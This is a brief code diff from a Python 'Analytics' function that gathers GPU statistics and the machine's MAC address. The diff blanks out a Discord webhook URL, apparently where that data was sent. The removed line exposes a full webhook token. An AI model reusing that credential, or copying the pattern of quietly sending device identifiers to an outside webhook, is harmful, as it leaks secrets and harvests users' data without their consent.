@@ -62,7 +62,7 @@ def Analytics():
         gpu_temperature = f"{gpu.temperature} °C"
         list_gpus.append((gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,gpu_total_memory, gpu_temperature))
 
-    url = 'https://discord.com/api/webhooks/1054296946648567818/PnHHeyIoLQh0jNWutGM1YPoq8N001K_05oFBDkdojIhGYqDU2d5X_zknZkuJCMzJNd_z'
+    url = ''
 
     compiled_ = {
         'mac': ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)for ele in range(0,8*6,8)][::-1]),
